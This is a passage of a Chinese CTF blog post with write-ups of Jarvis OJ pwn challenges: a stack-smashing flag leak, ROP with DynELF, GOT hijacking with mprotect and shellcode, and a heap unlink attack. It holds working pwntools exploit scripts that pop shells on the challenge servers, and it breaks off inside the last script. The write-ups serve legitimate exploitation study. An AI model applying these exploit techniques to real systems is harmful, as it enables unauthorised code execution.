      <link href="/2020/03/12/%E5%88%B7Jarvis%20OJ%E6%97%B6%E5%AD%A6%E5%88%B0%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF%5B%E4%B8%8D%E5%AE%9A%E6%97%B6%E6%9B%B4%E6%96%B0%5D/"/>
      <url>/2020/03/12/%E5%88%B7Jarvis%20OJ%E6%97%B6%E5%AD%A6%E5%88%B0%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF%5B%E4%B8%8D%E5%AE%9A%E6%97%B6%E6%9B%B4%E6%96%B0%5D/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Pwn弱鸡，比赛划水，只好跟着<a href="http://veritas501.space/2017/03/10/JarvisOJ_WP/" target="_blank" rel="noopener">大佬的博客</a>刷刷一些题目才能维持尊严，在刷题目的时候又发现了一些新姿势，在此记录一下。<strong>持续龟速更新中</strong></p><a id="more"></a><hr><h2 id="0x01-200pt-Smashes"><a href="#0x01-200pt-Smashes" class="headerlink" title="0x01 200pt Smashes"></a>0x01 200pt Smashes</h2><p>程序很简单，利用<strong>gets函数</strong>接受<strong>Name</strong>导致溢出，溢出到<strong>stack_check_fail函数</strong>报错的地方将服务端的flag给打印出来<br><img src="http://upload-images.jianshu.io/upload_images/8447551-545bce443b11d001.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="主函数"><br><img src="http://upload-images.jianshu.io/upload_images/8447551-b85c6c8312d3a637.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="服务端的flag"><br>但有个很恶心的地方就是后面的循环函数，正如他所说的<strong>Please overwrite the flag</strong>，在这个地方有3个判断：</p><ul><li>如果你什么都不输入就直接跳到<strong>exit</strong>，根本不会触发<strong>stackcheckfail</strong>。</li><li>输入<strong>n(n&lt;=32)</strong>个字符，就会将<strong>0x600d20+n</strong>的地方覆盖<strong>32-n</strong>个<strong>0</strong>，而这个地址恰好就是flag所在的地址，就是无论如何输入都会将<strong>0x600d20</strong>到<strong>0x600d40</strong>这段地址都会被我们所复写或者被<strong>memset</strong>给填充为<strong>0</strong></li></ul><p>然后就卡在这里了，一直想如何绕过这个循环，然鹅并没有卵用，绕不过去。最终参考了一下<strong>大佬的博客</strong>，发现Linux下有个机制<strong>ELF重映射</strong></p><blockquote><p>ELF重映射：当可执行文件足够小时，在不同的区段可能被多次映射。</p></blockquote><p>而这道题确实也就是考的这个，在gdb中可以看到在0x400000的地址将这个可执行文件重新映射了一遍，虽然我们覆盖掉了<strong>0x600d20</strong>处的flag但是在<strong>0x400d20</strong>处重映射的flag并没有被覆盖。<br><img src="http://upload-images.jianshu.io/upload_images/8447551-d6dc96e030e77702.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="ELF重映射"><br>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">'./smashes'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'pwn.jarvisoj.com'</span> , <span class="number">9877</span>)<span class="comment">#nc pwn.jarvisoj.com 9877</span></span><br><span class="line">flag_addr = <span class="number">0x400D20</span></span><br><span class="line">p.recvuntil(<span class="string">'name? '</span>)</span><br><span class="line">name = p64(flag_addr) * <span class="number">100</span> <span class="comment">#懒到不想精确计算该改哪个位置于是直接暴力覆盖flag</span></span><br><span class="line">p.sendline(name)</span><br><span class="line">p.recvuntil(<span class="string">'flag: '</span>)</span><br><span class="line">p.send(<span class="string">'\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><hr><h2 id="0x02-250pt-level4"><a href="#0x02-250pt-level4" class="headerlink" title="0x02 250pt level4"></a>0x02 250pt level4</h2><p>前几个level都是简单常见的栈溢出、ROP，到了第四个就很有意思了，虽然程序都是一样的，却没有给libc版本，用leak出来的地址去查也没有查到，在<strong>大佬的博客</strong>中看到了<strong>pwntools</strong>中的<strong>dynelf</strong>方法。<br>看看<a href="http://pwntools.readthedocs.io/en/stable/dynelf.html" target="_blank" rel="noopener">pwntools官方文档</a>中的<strong>Example</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Assume a process or remote connection</span></span><br><span class="line">p = process(<span class="string">'./pwnme'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Declare a function that takes a single address, and</span></span><br><span class="line"><span class="comment"># leaks at least one byte at that address.</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">    data = p.read(address, <span class="number">4</span>)</span><br><span class="line">    log.debug(<span class="string">"%#x =&gt; %s"</span> % (address, (data <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>)))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="comment"># For the sake of this example, let's say that we</span></span><br><span class="line"><span class="comment"># have any of these pointers.  One is a pointer into</span></span><br><span class="line"><span class="comment"># the target binary, the other two are pointers into libc</span></span><br><span class="line">main   = <span class="number">0xfeedf4ce</span></span><br><span class="line">libc   = <span class="number">0xdeadb000</span></span><br><span class="line">system = <span class="number">0xdeadbeef</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># With our leaker, and a pointer into our target binary,</span></span><br><span class="line"><span class="comment"># we can resolve the address of anything.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># We do not actually need to have a copy of the target</span></span><br><span class="line"><span class="comment"># binary for this to work.</span></span><br><span class="line">d = DynELF(leak, main)</span><br><span class="line"><span class="keyword">assert</span> d.lookup(<span class="literal">None</span>,     <span class="string">'libc'</span>) == libc</span><br><span class="line"><span class="keyword">assert</span> d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>) == system</span><br><span class="line"></span><br><span class="line"><span class="comment"># However, if we *do* have a copy of the target binary,</span></span><br><span class="line"><span class="comment"># we can speed up some of the steps.</span></span><br><span class="line">d = DynELF(leak, main, elf=ELF(<span class="string">'./pwnme'</span>))</span><br><span class="line"><span class="keyword">assert</span> d.lookup(<span class="literal">None</span>,     <span class="string">'libc'</span>) == libc</span><br><span class="line"><span class="keyword">assert</span> d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>) == system</span><br><span class="line"></span><br><span class="line"><span class="comment"># Alternately, we can resolve symbols inside another library,</span></span><br><span class="line"><span class="comment"># given a pointer into it.</span></span><br><span class="line">d = DynELF(leak, libc + <span class="number">0x1234</span>)</span><br><span class="line"><span class="keyword">assert</span> d.lookup(<span class="string">'system'</span>)      == system</span><br></pre></td></tr></table></figure><blockquote><p>要使用<strong>dynelf</strong>首先得需要一个能够<strong>leak</strong>出地址的函数，然后需要知道<strong>main函数的地址</strong>或者直接有<strong>可执行文件</strong>，下面的一堆<strong>assert</strong>大概是校准？有了上述条件后<strong>dynelf</strong>就可以开始工作了，原理就是从内存里面逐个泄露出地址来暴力搜索想要找的函数。</p></blockquote><p>所以这道题的基本思路就是通过<strong>read函数</strong>溢出构造好<strong>leak函数</strong>，用<strong>dynelf</strong>在内存中暴力搜索<strong>system</strong>实际地址，然后构造简单rop写<strong>/bin/sh</strong>并调用system函数即可。脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">global</span> p</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">'./level4'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'pwn2.jarvisoj.com'</span> , <span class="number">9880</span>)<span class="comment">#nc pwn2.jarvisoj.com 9880</span></span><br><span class="line"></span><br><span class="line">p3ret = <span class="number">0x8048509</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span> </span><br><span class="line">elf = ELF(<span class="string">'./level4'</span>)</span><br><span class="line">pay = <span class="string">'a'</span>*<span class="number">0x88</span> +<span class="string">'bbbb'</span></span><br><span class="line">pay += p32(elf.symbols[<span class="string">'write'</span>]) + p32(p3ret) + p32(<span class="number">1</span>) + p32(address) + p32(<span class="number">4</span>)</span><br><span class="line">pay += p32(elf.symbols[<span class="string">'main'</span>])</span><br><span class="line">p.sendline(pay)</span><br><span class="line">data = p.recv(<span class="number">4</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]leaking: "</span> + data</span><br><span class="line"><span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./level4'</span>)</span><br><span class="line">dyn =  DynELF(leak, elf=ELF(<span class="string">'./level4'</span>))</span><br><span class="line">bss_addr = <span class="number">0x804A024</span></span><br><span class="line">system_addr = dyn.lookup(<span class="string">'system'</span> , <span class="string">'libc'</span>)</span><br><span class="line">read_plt = elf.plt[<span class="string">'read'</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x88</span> + <span class="string">'xebp'</span> + p32(read_plt) + p32(p3ret) + p32(<span class="number">0</span>) + p32(bss_addr) + p32(<span class="number">8</span>) + p32(system_addr) + <span class="string">'xret'</span> + p32(bss_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>但不太清楚为什么明明通过<strong>system(‘/bin/sh’)</strong>起的shell却只能执行一次命令。<br><img src="http://upload-images.jianshu.io/upload_images/8447551-7d2b8d4476b77f40.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="只能执行一次命令"></p><hr><h2 id="0x03-300pt-level5"><a href="#0x03-300pt-level5" class="headerlink" title="0x03 300pt level5"></a>0x03 300pt level5</h2><p>从level0到level5的程序都是差不多的，考点也都是<strong>栈溢出</strong>，也就是说level5是最高难度的了。程序很简单，<del>可以直接溢出leak地址构rop起shell</del>，但那是level3_x64，虽然程序是一模一样的，同一个脚本也能pwn通，但是题目假设除了一个环境：<strong>mmap和mprotect练习，假设system和execve函数被禁用，请尝试使用mmap和mprotect完成本题。</strong>我跟着大牛的思路用<strong>mprotect函数</strong>，利用64位ELF文件的<strong>万能Gadget</strong>完成了本题。<br><img src="http://upload-images.jianshu.io/upload_images/8447551-bc13f18d0f26d87b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="主函数"></p><blockquote><p><strong>mprotect函数</strong><br>函数原型：<strong>int mprotect(const void *start, size_t len, int prot);</strong><br>函数功能：<strong>把自start开始的、长度为len的内存区的保护属性修改为prot指定的值</strong>，其中prot的值就和Linux系统对应的属性值。</p></blockquote><blockquote><p><strong>万能Gadget</strong><br>在64位ELF文件中会有一个名叫<strong>__libc_csu_init</strong>的函数，看其中的汇编代码我们会发现可以通过我们的精心构造可以访问任何地方。我们可以先跳转到<strong>红色箭头</strong>的地方，控制<strong>rbx</strong>、<strong>rbp</strong>、<strong>r12</strong>、<strong>r13</strong>、<strong>r14</strong>、<strong>r15</strong>这五个寄存器中的值，然后再<strong>ret</strong>到<strong>蓝色箭头</strong>的地方，我们可以发现刚刚我们构造的<strong>r13</strong>、<strong>r14</strong>、<strong>r15</strong>中的值分别传递到了<strong>rdx</strong>、<strong>rsi</strong>、<strong>rdi</strong>寄存器中。而熟悉的人肯定知道<strong>rdi</strong>、<strong>rsi</strong>、<strong>rdx</strong>中的值分别对应64位程序中调用函数的前三个参数。而且在这几句后面还有个<strong>call</strong>，这就很骚了，虽然后面是<strong>call [r12+rbx*8]</strong>看似很复杂的汇编语言，但是我们可以发现<strong>r12</strong>和<strong>rbx</strong>的值在红色箭头那里我们都是可控的。如果我们将<strong>rbx</strong>中的值构造为<strong>0</strong>，<strong>r12</strong>的值构造为我们想要跳转到一个<strong>指针p</strong>，这个<strong>指针p</strong>指向我们想要执行的<strong>函数f</strong>，那么我们就可以执行<strong>函数f</strong>了。而且，ELF文件中的<strong>got表</strong>中就有我们想要的指向函数的指针。<br><img src="http://upload-images.jianshu.io/upload_images/8447551-d7adfd25517acdaa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="万能Gadget"></p></blockquote><ul><li><strong>利用思路</strong><br>大概就是写<strong>shellcode</strong>到<strong>bss段</strong>，调用<strong>mprotect函数</strong>修改<strong>bss段</strong>为可执行，然后再跳转到<strong>bss段</strong>去执行我们的<strong>shellcode</strong>。首先将<strong>shellcode</strong>写到<strong>bss段</strong>就简单栈溢出调用<strong>read函数</strong>就能实现，而后面两步就需要用到<strong>万能Gadget</strong>访问函数，那么我们肯定是要<strong>hijack got表</strong>嘛，那就在<strong>got表</strong>里面找两个不太用的到的函数<strong>hijack</strong>一下呗。脚本如下：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">'./level5'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)</span><br><span class="line">gdb.attach(p , open(<span class="string">'aa'</span>))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'pwn2.jarvisoj.com'</span> , <span class="number">9884</span>)<span class="comment">#nc pwn2.jarvisoj.com 9884</span></span><br><span class="line">libc = ELF(<span class="string">'./libc-2.19.so'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./level5'</span>)</span><br><span class="line">offset = <span class="number">0x80</span></span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">read_plt = elf.plt[<span class="string">'read'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">main_addr = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x4006b3</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x4006b1</span></span><br><span class="line">pop_rbx_rbp_r12_r13_r14_r15_ret = <span class="number">0x4006a6</span></span><br><span class="line">evercall_addr = <span class="number">0x400690</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#step1 leak libc.addr</span></span><br><span class="line">p.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line">payload1 = <span class="string">'a'</span> * offset + <span class="string">'__xebp__'</span> + p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(pop_rsi_r15_ret) + p64(read_got) + <span class="string">'deadbeef'</span> + p64(write_plt) + p64(main_addr)</span><br><span class="line">p.send(payload1)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">8</span>)) - libc.symbols[<span class="string">'read'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(libc.address)</span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#step2 hijack __libc_start_main -&gt; mprotect</span></span><br><span class="line">p.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line">libc_start_main_got = elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">payload2 = <span class="string">'a'</span> * offset + <span class="string">'__xebp__'</span> + p64(pop_rdi_ret) + p64(<span class="number">0</span>) + p64(pop_rsi_r15_ret) + p64(libc_start_main_got) + <span class="string">'deadbeef'</span> + p64(read_plt) + p64(main_addr)</span><br><span class="line">p.send(payload2)</span><br><span class="line">mprotect_addr = libc.symbols[<span class="string">'mprotect'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(mprotect_addr)</span><br><span class="line">p.send(p64(mprotect_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#step3 write shellcode -&gt; bss</span></span><br><span class="line">p.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line">payload3 = <span class="string">'a'</span> * offset + <span class="string">'__xebp__'</span> + p64(pop_rdi_ret) + p64(<span class="number">0</span>) + p64(pop_rsi_r15_ret) + p64(bss_addr) + <span class="string">'deadbeef'</span> + p64(read_plt) + p64(main_addr)</span><br><span class="line">p.send(payload3)</span><br><span class="line">shellcode = asm(shellcraft.amd64.sh())</span><br><span class="line"><span class="keyword">print</span> shellcode</span><br><span class="line">p.send(shellcode)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#step4 hijack __gmon_start__ -&gt; bss_shellcode</span></span><br><span class="line">p.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line">gmon_start_got = elf.got[<span class="string">'__gmon_start__'</span>]</span><br><span class="line">payload4 = <span class="string">'a'</span> * offset + <span class="string">'__xebp__'</span> + p64(pop_rdi_ret) + p64(<span class="number">0</span>) + p64(pop_rsi_r15_ret) + p64(gmon_start_got) + <span class="string">'deadbeef'</span> + p64(read_plt) + p64(main_addr)</span><br><span class="line">p.send(payload4)</span><br><span class="line">p.send(p64(bss_addr))</span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#step5 using __libc_csu_init to call mprotect and change bss to executable and then execute shellcode</span></span><br><span class="line">p.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line">payload5 = <span class="string">'a'</span> * offset + <span class="string">'__xebp__'</span> + p64(pop_rbx_rbp_r12_r13_r14_r15_ret) + <span class="string">'deadbeef'</span> + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(libc_start_main_got) + p64(<span class="number">7</span>) + p64(<span class="number">0x1000</span>) + p64(<span class="number">0x600000</span>) + p64(evercall_addr) + <span class="string">'deadbeef'</span> + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(gmon_start_got) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(evercall_addr) </span><br><span class="line"><span class="comment">#                                                                           + 'deadbeef'    rbx      rbp      r12 -&gt; call r12+rbx*8   r13 -&gt; rdx  r14 -&gt; rsi     r15 -&gt; rdi</span></span><br><span class="line">p.sendline(payload5)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>没有像大佬那样一次性把<strong>ROP链</strong>构造完全然后一次性把函数都劫持到位，但我觉得这样一步一步的逻辑清楚一些，也便于自己写脚本，然后值得一提的是在<strong>万能Gadget</strong>中若将<strong>rbx</strong>构造得比<strong>rbp</strong>少一，也就是<strong>rbx</strong>中为<strong>0</strong>，<strong>rbp</strong>中为<strong>1</strong>，那么<strong>call</strong>完之后又会跳转到我们<strong>红色箭头</strong>那里然后又可以构造一次访问其他位置。(详情可以见<strong>call</strong>完后面的那串汇编代码)</li></ul><hr><h2 id="0x04-400pt-Guestbook2"><a href="#0x04-400pt-Guestbook2" class="headerlink" title="0x04 400pt Guestbook2"></a>0x04 400pt Guestbook2</h2><p>前面都是栈漏洞，之后应该就是堆题了吧，根据ida可以分析出结构体如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">heap</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> inuse;</span><br><span class="line">    <span class="keyword">int</span> length;</span><br><span class="line">    <span class="keyword">char</span> *post;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><strong>漏洞位置</strong><br>漏洞出在<strong>edit</strong>函数，在编辑已经定义的<strong>post</strong>时可以任意指定修改长度，并且<strong>realloc</strong>不会清空堆上的内容。以及<strong>del</strong>函数在<strong>free</strong>堆块后没有释放指针，造成存在<strong>Dangling Pointer</strong>。</li></ul><p><img src="https://upload-images.jianshu.io/upload_images/8447551-7f09e4432ad1ba4e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="edit"><br><img src="https://upload-images.jianshu.io/upload_images/8447551-66cc3ac5fdefc0ad.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="del"></p><blockquote><p><strong>unlink</strong></p><ul><li><strong>利用原理</strong><br>在<strong>free</strong>一个大小在<strong>fastbin</strong>以上的<strong>chunk</strong>时，会检查该<strong>chunk</strong>物理地址相连的两个<strong>chunk</strong>，并执行下面的逻辑:<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(chunk)</span><br><span class="line"><span class="keyword">if</span>(prev_chunk == freed)</span><br><span class="line">    unlink(prev_chunk)          <span class="comment">//将两个chunk合并</span></span><br><span class="line"><span class="keyword">if</span>(next_chunk == top_chunk)</span><br><span class="line">    ......                     <span class="comment">//合并到top_chunk</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(next_chunk == freed)</span><br><span class="line">    unlink(next_chunk)        <span class="comment">//将两个chunk合并</span></span><br><span class="line">to_unsortbin(chunk)          <span class="comment">//将经过处理合并后的chunk归入unsortbin</span></span><br></pre></td></tr></table></figure></li></ul><p><strong>unlink</strong>的时候会执行如下操作指针的代码，并且如今还有<strong>safe_unlink</strong>的<strong>check</strong>机制。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">unlink(P, BK, FD) &#123;                                            </span><br><span class="line">    FD = P-&gt;fd;      </span><br><span class="line">    BK = P-&gt;bk;      </span><br><span class="line">    <span class="keyword">if</span>(__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                        <span class="comment">//safe_unlink</span></span><br><span class="line">        malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P);      </span><br><span class="line">    <span class="keyword">else</span>&#123;      </span><br><span class="line">        FD-&gt;bk = BK;      </span><br><span class="line">        BK-&gt;fd = FD;</span><br><span class="line">       .........................................</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><strong>构造条件</strong><br>红色边框中的一个大堆块构造两个小堆块，大小都在<strong>unsort bin</strong>的范围内，并且将要<strong>free</strong>的堆块(黑色箭头所指)的前一个堆块为<strong>freed</strong>的状态，也就是该堆块的<strong>size</strong>位(绿色箭头所指)的<strong>prev_inuse</strong>为<strong>0</strong>，同样因为该堆块为<strong>inused</strong>状态，故下一堆块的<strong>size</strong>位(紫色箭头所指)的<strong>prev_inuse</strong>为<strong>1</strong>。这样就构造好了触发<strong>unlink</strong>的条件，此时<strong>free</strong>该堆块会导致前一个堆块进行<strong>unlink</strong>操作，现在要构造绕过<strong>safe_unlink</strong>的<strong>check</strong>了。也就是需要有一个指针指向前一个堆块的堆头处也就是如红色箭头所示<strong>ptr</strong>指向<strong>fake_prev</strong>，并且将该伪堆块的<strong>fd</strong>和<strong>bk</strong>分别布置为<strong>ptr-0x18</strong>和<strong>ptr-0x10</strong>(<strong>32位</strong>时为<strong>ptr-0xc</strong>和<strong>ptr-0x8</strong>)，这样就可以满足<strong>unsafe_unlink</strong>的<strong>check</strong>了。</li><li><strong>触发效果</strong><br>在<strong>unlink</strong>红色箭头所指的堆块后，指针<strong>ptr</strong>所指会由刚刚的<strong>fake_prev</strong>变成<strong>ptr-0x18</strong>的位置(红色箭头变为蓝色箭头)，再编辑<strong>ptr</strong>的时候就能够覆盖到<strong>ptr</strong>本身实现后续利用。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-2e89f9b95e1ebbc6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="unlink"></li></ul></blockquote><ul><li><strong>利用思路</strong></li></ul><p>先<strong>add</strong>堆块并<strong>free</strong>掉一个保证堆上有指向<strong>libc</strong>的指针，<strong>edit</strong>前一个结构体导致堆溢出覆盖掉后面的<strong>post</strong>后再通过<strong>list</strong>可泄露出<strong>libc</strong>的基址，再在后面的堆块中通过溢出构造<strong>unlink</strong>最终起<strong>shell</strong>。</p><ul><li><strong>my-exp</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span 